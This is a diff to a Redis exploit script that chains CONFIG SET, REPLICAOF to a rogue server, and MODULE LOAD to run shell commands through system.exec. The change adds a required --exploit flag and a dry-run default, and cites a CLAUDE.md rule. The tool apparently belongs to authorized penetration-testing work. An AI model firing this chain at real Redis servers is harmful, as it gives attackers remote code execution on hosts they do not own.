@@ -38,6 +38,7 @@ ROGUE_PORT=46379
 MODE="rogue"
 INTERACTIVE=0
 LEAVE_SO=0
+EXPLOIT=0
 
 while [ $# -gt 0 ]; do
     case "$1" in
@@ -53,12 +54,16 @@ while [ $# -gt 0 ]; do
         --rogue)       MODE="rogue"; shift ;;
         --interactive|-i) INTERACTIVE=1; shift ;;
         --leave-so)    LEAVE_SO=1; shift ;;
+        --exploit)     EXPLOIT=1; shift ;;
         -h|--help)
             cat <<EOF
-Usage: $0 --target host:port [--cmd 'shell-cmd'] [options]
+Usage: $0 --target host:port --exploit [--cmd 'shell-cmd'] [options]
 
 Required:
   --target IP:PORT     Redis victim
+  --exploit            REQUIRED to actually fire the MODULE LOAD chain. Without
+                       it the script prints what it would do and exits 0.
+                       Per CLAUDE.md §9 invariant 1.
 
 Common:
   --cmd 'cmd'          shell to run via system.exec (default: $CMD)
@@ -85,6 +90,19 @@ EOF
 done
 
 [ -z "$TARGET" ] && { err "--target required"; exit 1; }
+if [ "$EXPLOIT" != 1 ]; then
+    log "DRY RUN — would chain CONFIG SET + REPLICAOF + MODULE LOAD against $TARGET"
+    log "  mode:        $MODE"
+    log "  cmd:         $CMD"
+    log "  module:      $MODULE"
+    log "  remote-dir:  $REMOTE_DIR"
+    log "  remote-name: $REMOTE_NAME"
+    log "  rogue-port:  $ROGUE_PORT"
+    log ""
+    log "  Re-run with --exploit to actually load the module and execute the command"
+    log "  as the redis-server user. Authorized testing only."
+    exit 0
+fi
 if [ ! -f "$MODULE" ]; then
     # Prebuilt .so should be checked in. If it's missing, try to build it (offline-safe
     # if module/redismodule.h is also checked in).
